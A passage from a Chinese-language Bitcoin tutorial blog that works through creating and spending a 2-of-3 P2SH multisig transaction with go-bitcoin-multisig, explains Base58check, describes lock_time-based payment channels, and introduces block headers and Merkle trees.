<p>Key B:<br>046ce31db9bdd543e72fe3039a1f1c047dab87037c36a669ff90e28da1848f640de68c2fe913d363a51154a0c62d7adea1b822d05035077418267b1a1379790187 </p>
<p>Key C:<br>0411ffd36c70776538d079fbae117dc38effafb33304af83ce4894589747aee1ef992f63280567f52f5ba870678b4ab4ff6c8ea600bd217870a8b4f1f09f3a8e83 </p>
<p>然后，我们指明我们需要一个2-of-3的地址，并且将我们的3个公钥作为输入，以生成该P2SH地址：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">go-bitcoin-multisig address --m 2 --n 3 --public-keys 04a882d414e478039cd5b52a92ffb13dd5e6bd4515497439dffd691a0f12af9575fa349b5694ed3155b136f09e63975a1700c9f4d4df849323dac06cf3bd6458cd,046ce31db9bdd543e72fe3039a1f1c047dab87037c36a669ff90e28da1848f640de68c2fe913d363a51154a0c62d7adea1b822d05035077418267b1a1379790187,0411ffd36c70776538d079fbae117dc38effafb33304af83ce4894589747aee1ef992f63280567f52f5ba870678b4ab4ff6c8ea600bd217870a8b4f1f09f3a8e83</span><br></pre></td></tr></table></figure>

<p>以上命令的输出是：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">---------------------</span><br><span class="line">Your *P2SH ADDRESS* is:  </span><br><span class="line">347N1Thc213QqfYCz3PZkjoJpNv5b14kBd  </span><br><span class="line">Give this to sender funding multisig address with Bitcoin.  </span><br><span class="line">---------------------</span><br><span class="line">---------------------</span><br><span class="line">Your *REDEEM SCRIPT* is:  </span><br><span class="line">524104a882d414e478039cd5b52a92ffb13dd5e6bd4515497439dffd691a0f12af9575fa349b5694ed3155b136f09e63975a1700c9f4d4df849323dac06cf3bd6458cd41046ce31db9bdd543e72fe3039a1f1c047dab87037c36a669ff90e28da1848f640de68c2fe913d363a51154a0c62d7adea1b822d05035077418267b1a1379790187410411ffd36c70776538d079fbae117dc38effafb33304af83ce4894589747aee1ef992f63280567f52f5ba870678b4ab4ff6c8ea600bd217870a8b4f1f09f3a8e8353ae  </span><br><span class="line">Keep private and provide this to redeem multisig balance later.  </span><br><span class="line">---------------------</span><br></pre></td></tr></table></figure>

<p>生成的P2SH地址提供给Alice。</p>
<p>同时生成了Redeem Script，也即Bob在将Alice支付的钱赎出的时候提供的签名脚本。我们来细致地看一下这个redeem script的组成。根据Bitocoin协议的multisignature redeem script, 也结合上面对multisig的解释，一个正确的Multisig的赎出脚本应该是这样的：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;OP_2&gt; &lt;A pubkey&gt; &lt;B pubkey&gt; &lt;C pubkey&gt; &lt;OP_3&gt; &lt;OP_CHECKMULTISIG&gt;</span><br></pre></td></tr></table></figure>

<p>（OP_2<del>OP_16，指令代码0x52</del>0x60就是将2~16入栈）</p>
<p>以上redeem的输出脚本的内容分解一下如下：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233023.jpg" alt="img"></p>
<p>使用这个redeemScript，又经过两个步骤生成了P2SH地址:</p>
<ol>
<li>对redeemScript进行两次哈希：</li>
</ol>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">redeemScriptHash = RIPEMD160(SHA256(redeemScript))</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>Base58check使用前缀0x05对redeemscriptHash进行编码：</li>
</ol>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">P2SHAddress := base58check.Encode(&quot;05&quot;, redeemScriptHash)</span><br></pre></td></tr></table></figure>

<p>这样就得到了go-bitcoin-multisig给出的P2SH 地址<em>347N1Thc213QqfYCz3PZkjoJpNv5b14kBd。</em> 这时候可以将这个地址发送给Alice，Alice可以用这个地址生成支付交易。</p>
<h2 id="使用P2SH地址生成交易"><a href="#使用P2SH地址生成交易" class="headerlink" title="使用P2SH地址生成交易"></a>使用P2SH地址生成交易</h2><p>为了形成交易，Alice需要以下的信息：来自标准 P2PKH的输出，该 P2PKH的交易id（txid），相对应的私钥，需要发送的币的个数，以及目标P2SH地址（也就是上面刚生成的地址）。</p>
<p>使用如下命令：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">go-bitcoin-multisig fund --input-tx 3ad337270ac0ba14fbce812291b7d95338c878709ea8123a4d88c3c29efbc6ac --private-key 5JJyqG4bb15zqi7fTA4b227aUxQhBo1Ux6qX69ngeXYLr7fk2hs --destination 347N1Thc213QqfYCz3PZkjoJpNv5b14kBd --amount 65600</span><br></pre></td></tr></table></figure>

<p>输出是：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">-----------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">Your raw funding transaction is:  </span><br><span class="line">0100000001acc6fb9ec2c3884d3a12a89e7078c83853d9b7912281cefb14bac00a2737d33a000000008a47304402204e63d034c6074f17e9c5f8766bc7b5468a0dce5b69578bd08554e8f21434c58e0220763c6966f47c39068c8dcd3f3dbd8e2a4ea13ac9e9c899ca1fbc00e2558cbb8b01410431393af9984375830971ab5d3094c6a7d02db3568b2b06212a7090094549701bbb9e84d9477451acc42638963635899ce91bacb451a1bb6da73ddfbcf596bddfffffffff01400001000000000017a9141a8b0026343166625c7475f01e48b5ede8c0252e8700000000  </span><br><span class="line">Broadcast this transaction to fund your P2SH address.  </span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>注意的是，如果多次运行这个命令，每次结果会有些不同，因为在生成数字签名的时候nonce值每次会不同，其他值应该都是一样的。</p>
<p>同样地，来分解一下这个结果：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233024.jpg" alt="img"></p>
<p>和典型P2PKH 交易的主要不同之处在于scriptPubKey，这里scriptPubKey的形式是：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;OP_HASH160&gt; &lt;redeemScriptHash&gt; &lt;OP_EQUAL&gt;</span><br></pre></td></tr></table></figure>

<p>这里<em>OP_HASH160</em> 就是RIPEMD160(SHA256()) 函数。</p>
<p>这是便可以将以上交易向网络广播，以获得认证。以上交易的 <a href="https://link.zhihu.com/?target=https://blockchain.info/tx/02b082113e35d5386285094c2829e7e2963fa0b5369fb7f4b79c4c90877dcd3d">txid 为02b082113e35d5386285094c2829e7e2963fa0b5369fb7f4b79c4c90877dcd3d</a>。</p>
<p>【<strong>redeemScriptHash 和P2SHaddress的区别</strong>】</p>
<p>———————–这里是普及Base58的分割线——————————————-</p>
<p>之前理解有误，以为P2SHaddress就应该是在scriptPubkey中的地址。因为在执行生成Tx1的命令的时候，确实传入的参数是–destination 347N1Thc213QqfYCz3PZkjoJpNv5b14kBd。没想到最终在Tx1中出现的居然是1a8b0026343166625c7475f01e48b5ede8c0252e。经过分析，可以猜想得出来，这两个地址肯定是存在关系的——特别是综合考虑到output中的scriptPubkey，是在<OP_HASH160> <redeemScriptHash>也即，可以分析得出1a8b0026343166625c7475f01e48b5ede8c0252e是原始脚本经过hash160 的结果，而347N1Thc213QqfYCz3PZkjoJpNv5b14kBd则是1a8b……..经过base58check编码之后的结果。</p>
<p>那现在的问题其实主要在于，为什在命令中给出了–destination是347N….4kBd的情况下，能够顺利地得出1a8b….252e。</p>
<p>纠结这个问题其实主要是因为对Base58的理解不够。特别是哈希用多了，单向函数不能逆推的想法有点深入人心了。</p>
<p>为什么会使用Base58呢？</p>
<p>主要是为了更简洁方便地表示长串的数字。譬如，十进制计数系统使用0-9十个数字，而十六进制系统使用了额外的 A-F 六个字母。同样的数字，它的十六进制表 示就会比十进制表示更短。更进一步，Base64使用了26个小写字母、26个大写字母、10个数字以及两个符号（例 如“+”和“&#x2F;”）。Base58是Base64编码格式的子集，同样使用大小写字母和10个数字，但舍弃了一些容易错 读和在特定字体中容易混淆的字符。具体地，Base58不含Base64中的0（数字0）、O（大写字母o）、l（小写字母 L）、I（大写字母i），以及“+”和“&#x2F;”两个字符。简而言之，Base58就是由不包括（0，O，l，I）的大小写字母和数字组成。之所以做出这样的选择，就是对人友好，让人在看到Base58编码的数据之后不会疑惑，从而防止出错。这是因为，如果在比特币交易中如果因为看不清楚地址而输错了目标地址，那么付出去的钱是拿不回来的，所以一定要防止这种错误。</p>
<p>Base58是怎么工作的呢？</p>
<p>Base58 用在比特币和其它的加密货币中，不仅实现了数据压缩，保持了易读性，还具有错误诊断功能。具体工作方式如下图。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233025.jpg" alt="img"></p>
<p>在上面的例子中，payload就是1a8b…….252e，共20个字节（160位）；然后增加前缀，这里是0x05；新生成的字符串进行连续两次的SHA256哈希，取结果的前四个字节作为校验和形成后缀；这些进行base58编码的就是25个字节。</p>
<p>Base58编码实际上就相当于是10进制转换为16进制，只不过范围更大而不仅仅是0~F；Base58的字符集范围是123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz。但是和十六进制转换思路是一样的。也和进制转换可以相互转一样，经过Base58编码的数据也很容易到推出原始数据。</p>
<p>所以虽然命令的输入是347N…..4kBd，但是倒推出1a8b…….252e是没有问题的。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233026.jpg" alt="img"></p>
<p>—————-这里是Base58介绍结束，继续P2SH的分割线———————————</p>
<h2 id="赎回multisig-P2SH币"><a href="#赎回multisig-P2SH币" class="headerlink" title="赎回multisig P2SH币"></a>赎回multisig P2SH币</h2><p>在Alice的支付交易获得确认之后，Bob就可以输出其中的币了。现在生成另一对公私钥作为Bob赎出币后的目的地址。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">go-bitcoin-multisig keys --concise</span><br></pre></td></tr></table></figure>

<p>输出如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">--------------</span><br><span class="line">KEY #1  </span><br><span class="line">Private key:  </span><br><span class="line">5Jmnhuc5gPWtTNczYVfL9yTbM6RArzXe3QYdnE9nbV4SBfppLcx  </span><br><span class="line">Public key hex:  </span><br><span class="line">04459b7e1711f31e64507061bccb89fb618e86b254140dc98a42093e449fef067f2ece0a9b11a63697a11c5176528c436570499a13aa22824be53ea2718173b45a  </span><br><span class="line">Public Bitcoin address:  </span><br><span class="line">18tiB1yNTzJMCg6bQS1Eh29dvJngq8QTfx  </span><br><span class="line">--------------</span><br></pre></td></tr></table></figure>

<p>现在，需要上面生成P2SH地址的3对密钥中的两个私钥来生成Tx2中的签名脚本。在这里使用第一个和第三个私钥做例子。</p>
<p>为了生成tx2交易，Bob需要以下信息：首先是输入txid，也即Alice生成的交易Tx1的txid，使用的数量，以及支付的目标。同时在签名脚本中还必须有redeem script原文。因为之前仅提供了redeem script的哈希，所以只有Alice交易的接收方才知道它的原文。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">go-bitcoin-multisig spend --input-tx 02b082113e35d5386285094c2829e7e2963fa0b5369fb7f4b79c4c90877dcd3d --amount 55600 --destination 18tiB1yNTzJMCg6bQS1Eh29dvJngq8QTfx --private-keys 5JruagvxNLXTnkksyLMfgFgf3CagJ3Ekxu5oGxpTm5mPfTAPez3,5JjHVMwJdjPEPQhq34WMUhzLcEd4SD7HgZktEh8WHstWcCLRceV --redeemScript 524104a882d414e478039cd5b52a92ffb13dd5e6bd4515497439dffd691a0f12af9575fa349b5694ed3155b136f09e63975a1700c9f4d4df849323dac06cf3bd6458cd41046ce31db9bdd543e72fe3039a1f1c047dab87037c36a669ff90e28da1848f640de68c2fe913d363a51154a0c62d7adea1b822d05035077418267b1a1379790187410411ffd36c70776538d079fbae117dc38effafb33304af83ce4894589747aee1ef992f63280567f52f5ba870678b4ab4ff6c8ea600bd217870a8b4f1f09f3a8e8353ae</span><br></pre></td></tr></table></figure>

<p>使用以上信息可以生成输出：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Your raw spending transaction is:  </span><br><span class="line">01000000013dcd7d87904c9cb7f4b79f36b5a03f96e2e729284c09856238d5353e1182b00200000000fd5d01004730440220762ce7bca626942975bfd5b130ed3470b9f538eb2ac120c2043b445709369628022051d73c80328b543f744aa64b7e9ebefa7ade3e5c716eab4a09b408d2c307ccd701483045022100abf740b58d79cab000f8b0d328c2fff7eb88933971d1b63f8b99e89ca3f2dae602203354770db3cc2623349c87dea7a50cee1f78753141a5052b2d58aeb592bcf50f014cc9524104a882d414e478039cd5b52a92ffb13dd5e6bd4515497439dffd691a0f12af9575fa349b5694ed3155b136f09e63975a1700c9f4d4df849323dac06cf3bd6458cd41046ce31db9bdd543e72fe3039a1f1c047dab87037c36a669ff90e28da1848f640de68c2fe913d363a51154a0c62d7adea1b822d05035077418267b1a1379790187410411ffd36c70776538d079fbae117dc38effafb33304af83ce4894589747aee1ef992f63280567f52f5ba870678b4ab4ff6c8ea600bd217870a8b4f1f09f3a8e8353aeffffffff0130d90000000000001976a914569076ba39fc4ff6a2291d9ea9196d8c08f9c7ab88ac00000000  </span><br><span class="line">Broadcast this transaction to spend your multisig P2SH funds.</span><br></pre></td></tr></table></figure>

<p>同样地，来分析一下这个交易：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233027.jpg" alt="img"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233028.jpg" alt="img"></p>
<p>OP_PUSHDATA1命令的功能是指出下一个字节是将要入栈的字节数。</p>
<p>来具体地看一下Bitcoin协议怎么样运行这个脚本，首先是将scriptPubKey脚本和scriptSig脚本合并，然后得到：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;OP_0&gt; &lt;sig A&gt; &lt;sig C&gt; &lt;redeemScript&gt; &lt;OP_HASH160&gt; &lt;redeemScriptHash&gt; &lt;OP_EQUAL&gt;</span><br></pre></td></tr></table></figure>

<p>详细的步骤：</p>
<ol>
<li><em>OP_0</em>和 sigA 以及 sigC 入栈。</li>
<li>redeemScript 入栈。</li>
<li><em>OP_HASH160</em> 对redeemScript执行哈希，栈顶是redeemScript的哈希值。</li>
<li>redeemScriptHash入栈。</li>
<li><em>OP_EQUAL</em>将会比较 OP_HASH160(redeemScript)的结果和后入栈的 redeemScriptHash ，这一步证明了是否提供了正确的redeemscript，也即是否是币的合法的所有者。</li>
<li>然后开始执行redeemScript:<br><OP_2> <A pubkey> <B pubkey> <C pubkey> <OP_3> <OP_CHECKMULTISIG></li>
<li><em>OP_CHECKMULTISIG</em> 将对 3个公钥和栈中的2 个签名进行验证。</li>
</ol>
<p>注意事项：</p>
<ul>
<li>上一节中我们讲过生成scriptSig时，为了对交易进行签名，（因为签名是交易的一部分，在在生成签名之前，需要有替代的填充项），使用了scriptPubkey作为填充，在P2SH中，进行填充的是<em>redeemScript。</em></li>
<li>当将数据入栈的时候，一般的格式是<size of item> <item>，但是，如果<item>多于75字节，则需要使用特殊的指令 <em>OP_PUSHDATA1</em>, <em>OP_PUSHDATA2</em> and <em>OP_PUSHDATA4，</em>分别指示其后1、2、4个字节是需要入栈的数据的长度 。</li>
<li>scriptSig的长度需要包括在交易中，数据类型是var_int，如果scriptSig长度很长，长于253 ,则需要使用额外的字节表示。此时，使用 0xfd (253) 后面跟上2个字节指示scriptSig 的长度。但是，一定要是必要的时候，也即scriptSig确实很长的时候才这样做，否则会出错。</li>
</ul>
<p>此时就可以将本交易广播，可以看到这个交易已经被确认了， <a href="https://link.zhihu.com/?target=https://blockchain.info/tx/eeab3ef6cbea5f812b1bb8b8270a163b781eb7cde10ae5a7d8a3f452a57dca93">txid 是eeab3ef6cbea5f812b1bb8b8270a163b781eb7cde10ae5a7d8a3f452a57dca93</a>。</p>
<h2 id="TimeLock"><a href="#TimeLock" class="headerlink" title="TimeLock"></a>TimeLock</h2><p>在刚开始看交易的细节时，我们就遇到过Lock Time这个域。Lock Time顾名思义，就是锁定一些币，在达到某个时间或者某个区块之前不能使用这些币。在之前的交易中这个值都是0，也即不用锁定。那么在什么情况下需要使用lock time呢？</p>
<p>虽说比特币交易比传统的交易费用低——譬如信用卡，当使用信用卡时，如果花费的金额较低，商家可能会拒绝接受信用卡，因为每一笔信用卡使用都需要付手续费，但是为了鼓励矿工尽快将自己的交易打包，一般都会在交易中预留交易费用。但是，有些情况下，可能需要快速地变更支付的费用，因此，就有必要防止快速而经常地进行交易而导致的交易费用。</p>
<p>例如，用户需要在一段时间内连续地使用咖啡店的wifi，咖啡店希望每天支付一次流量费用。但是如果每天产生一笔交易，交易费用会很高。可以提出一种zero-trust的方案，意味着，交易是完全自动的， 只需要在最初预留一部分钱，然后系统会自动地按需进行支付，而咖啡店也能够放心地让用户使用而不至于担心用户会赖账。而真正进行广播，也即需要支付交易费用的交易的数量也能受到控制。</p>
<p>思路是这样的：</p>
<p>假设Alice是用户，Bob代表咖啡店。首先Alice生成一个交易Tx1，譬如支付100个币到一个2-of-2的multisig地址，也即这笔钱需要Alice和Bob共同签名才能使用。Alice首先对这个交易进行签名，然后广播这个交易。</p>
<p>Bob看到这个交易之后可以让Alice使用wifi。接下来每天Alice生成新的一个交易发给Bob，使用Tx1中的钱支付给Bob，譬如第一天支付1个币给Bob，99个币给Alice；第二天支付2个币给Bob，98个币给Alice；等等。每天Bob看到这个交易，就会同意Alice继续使用网络。因为Tx1是2-of-2的交易类型，所以Bob看到Alice的签名，如果他想要获得支付，只要完成自己的签名部分就行了，所以Bob可以放心Alice不会赖账。</p>
<p>当第28天Alice的工作完成不再需要咖啡店的网络了，就会通知Bob，对第28天的交易进行签名，也即总共支付28个币给Bob，剩余的72个币会返还给Alice。</p>
<p>我们来想一下，这个过程中，Bob可以放心，对Alice会不会有损失？</p>
<p>如果Bob是诚实的，这个过程会很顺利；但是如果Bob比较坑，在Alice使用完网络之后他一直不签名，那么Alice预付的100个币就一直锁死在网络中了。虽然Bob没有获得自己应得的那部分钱，但是Alice的损失更大。</p>
<p>为了防止出现这种情况，可以使用lock_time。</p>
<ol>
<li>首先Alice创建public key (K1)，然后请求Bob的公钥(K2)。</li>
<li>创建一个OP_CHECKMULTISIG交易Tx1，支付100个币到Multisig地址，也即需要Alice和Bob两人签名才能使用。Alice对这个交易签名，但是暂时并不广播。</li>
<li>Alice创建退款交易Tx2，Tx2使用Tx1的输出作为输入，并且将所有的钱都返回给Alice。这个交易设置了lock_time，譬如30天之后。Alice将这个交易提供给Bob。</li>
<li>Tx2主要是为了防止Bob坑，所以Bob为了证明自己不坑，会给Tx2签名，然后将签名返回给Alice。</li>
<li>Alice验证Bob的签名，如果正确，说明她的退款有保障，因此也就可以放心。</li>
<li>Alice此时对Tx1进行签名（这是对Tx1的input的支付签名），并且将签名发送给Bob。此时Alice或者Bob可以发布Tx1。此时Alice的100个币相当于被锁定了。</li>
<li>然后Alice创建新的交易Tx3，使用Tx1的输出作为输入。Tx3类似于Tx2，但是有两个输出，譬如1个币给Bob，99个币给Alice。Alice对这个交易签名，发给Bob。</li>
<li>Bob收到Tx3和Alice的之后，验证签名的正确性。此时Bob如果加上自己的签名，就可以发布和广播这个交易，并获得1个币。但是因为Alice还在持续地使用Bob提供的服务，马上对这个交易进行签名，很明显是不明智的。</li>
<li>之后每天Alice会继续创建类似的交易Tx3，都是用Tx1的输出作为输入。但是每次支付给Bob的币都在增多，留给自己的在减少。Bob收到之后进行验证。</li>
<li>当Alice决定停止使用服务的时候，通知Bob，Bob对收到的最后一个Tx3进行签名并且广播。</li>
</ol>
<p>如果Alice想利用Tx2进行双重支付，会不会成功呢？这时就是locktime起作用的时候了。因为这个Tx2不会立刻生效，所以Bob签字的Tx3会被首先确认，之后Tx2因为和Tx3使用的同一个输入，所以Tx2就是一个无效交易，因此双重支付不会成功。</p>
<hr>
<p>参照</p>
<p>[<a href="https://link.zhihu.com/?target=https://aaron67.cc/2019/01/02/bitcoin-transaction-timelocks/">学习笔记] 比特币交易的时间锁aaron67.cc<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233029.jpg" alt="图标"></a></p>
<p>和</p>
<p>[<a href="https://link.zhihu.com/?target=https://aaron67.cc/2018/12/31/bitcoin-transaction-null-data/">学习笔记] OP_RETURNaaron67.cc<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233030.jpg" alt="图标"></a></p>
<p>补充部分内容</p>
<hr>
<h2 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h2><p>以上的例子实际上就是智能合约（在区块链上运行的程序）。通过使用脚本、矿工和交易验证能够实现传统上需要第三方中心机构才能完成的一些功能，这是一件相当了不起的事情。对智能合约的研究远远超出了上面列出来的例子，虽然比特币对智能合约的支持并不完善，但是如上所示，已经可以完成不少有意义的工作。</p>
<p>参考：</p>
<ol>
<li><p><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0011.mediawiki">https://github.com/bitcoin/bips/blob/master/bip-0011.mediawiki</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/Script">Script - Bitcoin Wiki</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://github.com/ChristopherA/Learning-Bitcoin-from-the-Command-Line">ChristopherA&#x2F;Learning-Bitcoin-from-the-Command-Line</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/BIP_0016">BIP 0016 - Bitcoin Wiki</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://www.soroushjp.com/2014/12/20/bitcoin-multisig-the-hard-way-understanding-raw-multisignature-bitcoin-transactions/">Bitcoin multisig the hard way: Understanding raw P2SH multisig transactions</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://medium.com/summa-technology/bitcoins-time-locks-27e0c362d7a1">https://medium.com/summa-technology/bitcoins-time-locks-27e0c362d7a1</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0065.mediawiki">bitcoin&#x2F;bips</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/Contract">Contract - Bitcoin Wiki</a></p>
</li>
</ol>
<h1 id="比特币技术9-比特币机制-3"><a href="#比特币技术9-比特币机制-3" class="headerlink" title="比特币技术9:比特币机制(3)"></a>比特币技术9:比特币机制(3)</h1><p>到目前为止，我们重点介绍了单个交易的构建和赎出的过程。在区块链中，多个交易是被打包到一个区块中。使用包含多个交易区块而不是单个交易作为共识的单位，主要的目的是优化，因为如果矿工是针对每个交易而不是多个交易一起进行共识，那么效率就太低了。这一节中，我们主要对区块进行一些介绍。</p>
<h2 id="Merkle树"><a href="#Merkle树" class="headerlink" title="Merkle树"></a>Merkle树</h2><h3 id="比特币中的Merkle树"><a href="#比特币中的Merkle树" class="headerlink" title="比特币中的Merkle树"></a>比特币中的Merkle树</h3><p>之前查看交易信息的时候，可以看到每个交易都是自己相关的区块信息，</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233031.jpg" alt="img"></p>
<p>可以看到交易包含在333676区块中，333676也称为区块的高度；点开看看，<a href="https://link.zhihu.com/?target=https://www.blockchain.com/btc/block-index/511488">Bitcoin Block #333676</a></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233032.jpg" alt="img"></p>
<p>到现在为止，大家应该对其中的大部分信息都比较熟悉了，譬如右侧的哈希项中，除了Merkle Root这一项看起来比较陌生之外，其他的信息应该都能够理解。</p>
<p>区块是一种被包含在公开账簿（区块链）里的聚合了交易信息的容器数据结构。它由一个包含元数据的区块头和紧跟其后的构成区块主体的一长串交易列表组成。区块头是80字节，而平均每个交易至少是250字节，而且平均每个区块至少包含超过500个交易。具体看一下，区块的结构：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233033.jpg" alt="img"></p>
<p>区块链中的区块主要依赖于两种基于Hash的数据结构，一是区块的哈希链，通过哈希指针（hash pointer）形成的链，在上面的链接中，通过点击哈希值，页面可以跳转到之前或者之后的区块；二是区块内的每个块内的交易组成的树状结构。如下图所示。</p>
<p>【哈希指针是一种数据结构，是一个指向数据存储位置及其位置数据的哈希值的指针。这就使得正常的指针可用于取回信息，哈希指针用于验证信息是否发生改变。】</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233034.jpg" alt="img"></p>
<p>上图中，图的上半部分是区块头；下半部分则是对区块头部中的Merkle根的计算过程的展开。每个区块中的交易形成了一棵Merkle树，Merkle树的根包括在区块头中。区块通过保存前一个块的哈希值形成了一条链。区块包括头部和具体的交易，具体来说，区块头部包括如下信息：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233035.jpg" alt="img"></p>
<p>由于区块头里面包含“父区块哈希值”字段，所以当前区块的哈希值也受到该字段的影响。如果父区块的身份标识发生变化，子区块的身份标识也会跟着变化。当父区块有任何改动时，父区块的哈希值也发生变化。这将迫使子区块的“父区块哈希值”字段发生改变，从而又将导致子区块的哈希值发生改变。而子区块的哈希值发生改变又将迫使孙区块的“父区块哈希值”字段发生改变，又因此改变了孙区块哈希值，以此类推。一旦一个区块有很多代以后，这种瀑布效应将保证该区块不会被改变，除非强制重新计算该区块所有后续的区块。正是这样的重新计算需要耗费巨大的计算量，所以一个长区块链的存在可以让区块链的历史不可改变，这也是比特币安全性的一个关键特征。</p>
<p>区块主标识符是它的加密哈希值，一个通过SHA256算法对区块头进行二次哈希计算而得到的数字指纹。产生的32字节哈希值被称为区块哈希值，但是更准确的名称是：区块头哈希值，因为只有区块头被用于计算。例 如: 000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f是第一个比特币区块的区块哈希值。区块哈希值可以唯一、明确地标识一个区块，并且任何节点通过简单地对区块头进行哈希计算都可以独立地获取该区块哈希值。</p>
<hr>
<p>每个区块都包含一个或多个交易。每个区块的第一个交易是coinbase transaction，也即generation transaction，作为矿工打包交易生成区块的奖励，当前的挖矿奖励是12.5个比特币。coinbase交易的UTXO有一个特殊的规定，至少在100个区块之后才能作为输入进行花费。主要是防止矿工在区块还没有被正式确认的情况下就把币给花了。虽然区块并不要求除了coinbase之外的交易，但是矿工们一般都会尽量多打包一些交易，以获得尽可能多的交易费用。</p>
<p>区块中的所有交易都使用二进制<a href="https://link.zhihu.com/?target=https://bitcoin.org/en/glossary/serialized-transaction">raw transaction</a>的格式保存在区块中，然后对raw transaction进行哈希得到交易id（txid）。merkle树就是使用这样的txid进行构造的。</p>
<h3 id="Merkle树概念"><a href="#Merkle树概念" class="headerlink" title="Merkle树概念"></a>Merkle树概念</h3><p>Merkle tree是一种哈希二叉树，以Ralph Merkle命名，Ralph在1979年对该数据结构申请了专利（于2002年过期）。它是一种用做快速归纳和校验大规模数据完整性的树形数据结构。</p>
<p>特点:</p>
<ul>
<li>它是一种树，大多数是<a href="https://zh.wikipedia.org/zh/%E4%BA%8C%E5%8F%89%E6%A0%91">二叉树</a>，也可以是多叉树，具有树结构的所有特点。</li>
<li>Merkle Tree的叶子节点是数据块的哈希。</li>
<li>Merkle Tree的非叶子节点的哈希值是根据它下面所有叶子节点的值哈希计算得到，如下图所示。</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233036.jpg" alt="img"></p>
<p>在上图中， T<sub>A</sub><del>T<sub>H</sub>是区块中包括的正常的交易。从底层向上构建Merkle树，对每个交易都进行哈希，分别得到 H<sub>A</sub></del>H<sub>H</sub>!生成的单个哈希与邻近的哈希值组合，再次进行哈希。譬如  H<sub>A</sub>和 H<sub>B</sub>组合，再次进行哈希，得到 H<sub>AB</sub>. 这个过程一直持续下去，从底层一直到树根。</p>
<p>如果节点总数是奇数个，则复制一份最后一个节点。譬如对于5个叶子节点的情况，最终生成的树可能是这样的：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233037.jpg" alt="img"></p>
<p>如果叶子恰好是2的次方，则在树根处的情况如下：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233038.jpg" alt="img"></p>
<p>在上图中，<strong>merkle root，</strong>标记为 H<sub>ABCDEFGHIJKLMNOP</sub>,是一个32字节的数据，并且会被放置在区块头中，代表了整个区块的交易数据。</p>
<p>由于哈希的单向性，可以得出结论，如果两棵Merkle树的merkle root相同，那么这两棵树的结构和每个节点也必然是相同的。另外，只要存储的叶子节点数据有任何的变动，就会逐级向上传递到相应的父节点，最终使得Merkle树的根节点哈希值发生变化。</p>
<p>除了区块链之外，Merkle可信树在其他领域应用也很多，如在分布式系统中用于数据一致性验证，git中的版本一致性验证也是基于Merkle树。大部分Merkle树是二叉哈希树，在比特币中，merkle树主要适用于组织正常的交易，使得交易易于验证并且使用较少的资源。</p>
<p>为什么要使用这样的数据结构呢？树这种数据结构我们应该是比较熟悉的，特别是这种满二叉树。那我们来算一下，如果如上图所示，有16个叶子节点，也即一个区块中有16个交易，那么总共需要多少次哈希计算？如果是为了保证区块中的交易没有被篡改，那么实际上只需要把16个交易连接起来，然后对整个内容做一次哈希就够了，为什么要这么麻烦形成一棵树，而且做这么多次的计算呢？</p>
<p>我们来使用分布式文件服务器做例子。如果两个服务器A和B都是对某个文件系统的冗余备份。现在希望A和B通信来确认一下，它们所保存的文件是一致的。如果不使用哈希，那么这个通信代价是整个的文件系统，需要把所有的文件都传递到一个进行比较的服务器上，然后进行字符串比较。这无疑是非常低效的。比较哈希当然是一个好方法。因为哈希的单向性和固定的输出长度，所以通信代价就大大降低了。那么为什么要用一棵树呢？</p>
